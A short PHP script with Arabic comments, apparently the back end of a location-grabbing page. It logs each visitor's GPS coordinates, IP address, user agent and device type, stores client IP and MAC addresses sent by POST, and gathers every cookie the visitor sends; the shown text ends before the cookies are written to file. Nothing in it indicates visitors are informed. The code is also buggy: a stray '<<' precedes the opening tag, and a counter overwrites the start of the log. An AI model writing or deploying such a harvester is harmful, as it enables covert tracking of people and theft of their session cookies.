<<?php

// تعيين المنطقة الزمنية الافتراضية لـ PHP على "Africa/Cairo".
date_default_timezone_set('Africa/Cairo');

// فتح ملف "location.txt" للكتابة، وإذا كان الملف موجودًا فسيتم تعيين الرقم التالي للمستخدم (ID) إلى عدد الأسطر في الملف زائد 1، وإذا لم يكن الملف موجودًا فسيتم تعيين الرقم التالي للمستخدم (ID) إلى 1.
$my_file = fopen("location.txt", "a");
if (file_exists("location.txt")) {
    $id = count(file("location.txt")) + 1;
} else {
    $id = 1;
}

// فتح الملف "location.txt" للقراءة والكتابة، واستخدام دالة "fgets" لقراءة الرقم الأخير الموجود في الملف.
$fp = fopen("location.txt", "r+");
$last = fgets($fp);

// إذا كان الملف فارغًا أو لا يحتوي على رقم صحيح، فسيتم تعيين الرقم التالي للمستخدم (ID) إلى 1، وإلا فسيتم تعيينه إلى الرقم الأخير الموجود في الملف زائد 1.
if ($last === false || !is_numeric(trim($last))) {
    $next = 1;
} else {
    $next = intval(trim($last)) + 1;
}

// إعادة تعيين مؤشر الملف إلى بداية الملف، وكتابة الرقم التالي في الملف مع سطر جديد، وإغلاق الملف.
fseek($fp, 0);
fwrite($fp, $next . "\n");
fclose($fp);

// تعيين معلومات الجهاز والموقع الجغرافي ومعلومات الزائر في متغير نصي.
ini_set('browscap', 'browscap.ini');
$browser = get_browser(null, true);
$device = $browser['device_type'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date("Y-m-d H:i:s");
$information = "\nID: " . $next . "\nDate: " . $date . "\nlat:".$_GET["lat"] . "\nlong:" . $_GET["long"]. "\nIp: ". $ip . "\nUser-Dvice: " .$_GET["user_agent"];

// كتابة المعلومات في ملف "location.txt"، وإغلاق الملف.
fwrite($my_file,$information);
fclose($my_file);

// كتابة نوع الجهاز في ملف "divece.txt".
$file = fopen("divece.txt","w");
fwrite($file, $device);
fclose($file);

// إضافة عنوان IP إلى ملف "location.txt".
$file = 'location.txt';
$current = file_get_contents($file);
$current .= "$ip\n";
file_put_contents($file, $current);

// إذا تم إرسال طلب POST، فسيتم حفظ عنوان IP وMAC المرسل من العميل في ملف "address-info.txt".
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $clientIP = $_POST['ip'];
    $clientMAC = $_POST['mac'];
    $file = 'address-info.txt';
    $data = 'Client IP: ' . $clientIP . "\n";
    $data .= 'Client MAC: ' . $clientMAC . "\n";
    file_put_contents($file, $data, FILE_APPEND);
}

// حفظ ملفات تعريف الارتباط في ملف "cookies.txt".
$file = 'cookies.txt';
$data = '';
foreach ($_COOKIE as $name => $value) {
    $data .= $name . ' = ' . $value . "\n";
}


